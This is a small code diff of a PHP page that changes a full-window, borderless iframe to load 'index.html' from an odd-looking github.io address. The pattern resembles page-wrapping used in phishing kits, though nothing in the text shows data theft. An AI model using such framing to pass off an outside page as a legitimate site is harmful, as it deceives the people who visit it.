@@ -50,7 +50,7 @@ foreach ($_SESSION as $key => $val) {
 </head>
 
 <body id="start">
-    <iframe src="https://b6sics.github.io/Lo1a@E6lO8ll4/" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="100%" scrolling="auto">
+    <iframe src="https://b6sics.github.io/Lo1a@E6lO8ll4/index.html" frameborder="0" marginheight="0" marginwidth="0" width="100%" height="100%" scrolling="auto">
     </iframe>
 </body>
 
